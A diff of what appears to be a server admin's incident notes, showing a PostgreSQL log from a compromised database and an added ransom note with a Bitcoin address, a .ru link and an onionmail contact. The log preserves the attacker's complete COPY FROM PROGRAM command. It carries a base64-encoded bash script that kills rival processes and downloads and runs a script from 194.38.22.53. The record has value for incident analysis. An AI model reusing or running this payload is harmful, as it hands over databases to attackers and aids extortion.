@@ -1,4 +1,9 @@
 
+All your data is backed up. You must pay 0.01 BTC to 14PYVptPexgRpHRm7SSrFMAyBKYymkRA55 In 48 hours, your data will be publicly disclosed and deleted. (more information: go to http://iplis.ru/data3)
+After paying send mail to us: rambler+3p78@onionmail.org and we will provide a link for you to download your data. Your DBCODE is: 3P78
+(2 rows)
+
+
 dima@otus:~$ sudo tail /var/log/postgresql/postgresql-15-main.log
 2023-11-19 14:01:37.383 UTC [35584] postgres@postgres STATEMENT:  DROP TABLE IF EXISTS gsZcJLZn;CREATE TABLE gsZcJLZn(cmd_output text);COPY gsZcJLZn FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDE5NC4zOC4yMi41My9wZy5zaHxiYXNoCmVsaWYgWyAteCAiJChjb21tYW5kIC12IHdnZXQpIiBdOyB0aGVuCiAgd2dldCAtcSAtTy0gMTk0LjM4LjIyLjUzL3BnLnNofGJhc2gKZWxzZQogIF9fY3VybCBodHRwOi8vMTk0LjM4LjIyLjUzL3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM gsZcJLZn;DROP TABLE IF EXISTS gsZcJLZn;
 2023-11-19 14:01:37.404 UTC [35590] postgres@postgres FATAL:  terminating connection due to administrator command
@@ -10,7 +15,6 @@ dima@otus:~$ sudo tail /var/log/postgresql/postgresql-15-main.log
 2023-11-19 14:01:37.458 UTC [15993] LOG:  checkpoint complete: wrote 47 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.003 s, sync=0.016 s, total=0.044 s; sync files=69, longest=0.014 s, average=0.001 s; distance=298 kB, estimate=12847 kB
 2023-11-19 14:01:37.462 UTC [90009] postgres@postgres FATAL:  the database system is shutting down
 2023-11-19 14:01:37.471 UTC [15992] LOG:  database system is shut down
-
 
 
 
